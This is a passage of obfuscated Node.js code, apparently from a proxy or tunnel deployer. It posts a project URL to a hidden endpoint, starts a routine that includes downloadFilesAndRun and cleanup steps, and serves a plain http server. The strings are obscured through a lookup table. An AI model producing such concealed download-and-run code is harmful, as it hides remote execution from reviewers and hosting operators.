_0x4070a9=_0x2a0a8f;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4070a9(0xf9)](_0x4070a9(0x131));return;}try{const _0x5106d1=await axios[_0x4070a9(0x12b)](_0x4070a9(0x117),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4070a9(0x133)}});return console[_0x4070a9(0xf9)](_0x4070a9(0x1a4)),_0x5106d1;}catch(_0x35049a){return console[_0x4070a9(0x1b1)](_0x4070a9(0x109)+_0x35049a[_0x4070a9(0x19f)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x55d4c9){console['error']('Error\x20in\x20startserver:',_0x55d4c9);}}startserver()[_0x2a0a8f(0x108)](_0x1c43c6=>{const _0x365a9c=_0x2a0a8f;console[_0x365a9c(0x1b1)]('Unhandled\x20error\x20in\x20startserver:',_0x1c43c6);}),app[_0x2a0a8f(0x1a9)](PORT,()=>console[_0x2a0a8f(0xf9)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
